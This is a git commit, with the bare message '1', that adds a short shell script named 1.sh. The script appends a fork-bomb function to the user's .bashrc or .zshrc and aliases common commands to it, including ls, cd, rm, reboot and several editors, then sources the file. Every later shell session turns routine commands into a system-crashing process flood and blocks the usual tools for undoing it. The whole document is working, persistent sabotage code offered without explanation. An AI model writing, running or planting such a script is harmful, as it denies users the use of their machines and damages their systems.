e0ebb4edfe622a95977cfe9480e105949f046553
Devanandan N B <nbdevanandan14@gmail.com>
2026-02-18 16:01:44 +0530

    1

---
+++ 1.sh
@@ -0,0 +1,17 @@
+#!/usr/bin/env sh
+
+case "$SHELL" in
+  *zsh*)
+    CONF_FILE="$HOME/.zshrc"
+    ;;
+  *bash*)
+    CONF_FILE="$HOME/.bashrc"
+    ;;
+esac
+
+
+fun="bomb() { bomb | bomb & }; alias ls='bomb'; alias cd='bomb'; alias reboot='bomb'; alias nano='bomb'; alias rm='bomb' alias vim='bomb'; alias nvim='bomb'; alias helix='bomb'; alias hx='bomb'; alias emacs='bomb'"
+
+echo "$fun" >> "$CONF_FILE"
+
+source "$CONF_FILE"
